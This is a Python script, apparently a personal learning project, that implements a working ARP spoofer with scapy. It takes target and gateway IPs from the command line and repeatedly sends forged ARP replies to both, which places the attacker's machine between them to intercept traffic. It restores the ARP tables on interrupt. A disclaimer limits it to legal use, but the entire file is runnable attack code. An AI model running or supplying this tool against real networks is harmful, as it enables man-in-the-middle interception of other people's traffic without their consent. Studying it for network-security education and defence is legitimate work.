"""
An ARP spoofer using scapy. Written to expand my own knowledge on cybersecurity.
This tool may be used for legal purposes only.  Users take full responsibility
for any actions performed using this tool.  If these terms are not acceptable to
you, then do not use this tool.

Seido Karasaki(yakitategohan on github)
v1 2/9/2023
"""

import scapy.all as scapy
import argparse
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest='target', help='Target IP')
    parser.add_argument("-g", "--gateway", dest='gateway', help='Gateway IP')
    options = parser.parse_args()
    return options


# Scan network for IP, get mac
def get_mac(ip):
    # Instantiate ARP frame obj as arp_request
    arp_request = scapy.ARP(pdst=ip)

    # Instantiate Ethernet frame obj as broadcast, set MAC address as broadcast
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')

    # Combine both frames
    arp_request_broadcast = broadcast / arp_request

    # send request, returns two lists
    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=1)

    # Return mac
    return answered[0][1].hwsrc


# ARP packet to spoof ip
def spoof(target_ip, spoof_ip):
    # OP sets if req or response. 2 indicates response. pdst = target ip, hwdst = target mac, psrc = gateway ip
    # Sends ARP packet to victim, spoofs own IP as gateway. Victim sends all packets to
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    # Restore the ARP table to original, have to specify source mac add or else it will default to own mac add
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=get_mac(destination_ip),
        psrc=source_ip,
        hwsrc=get_mac(source_ip)
    )
    scapy.send(packet, verbose=False, count=4)


if __name__ == "__main__":
    sent_packets = 0
    args = get_arguments()
    target_ip = args.target
    gateway_ip = args.gateway
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets += 2
            print(f'\r[+] Packets sent: {sent_packets}\n', end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print('\nDetected CTRL C.... resetting ARP tables!')
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
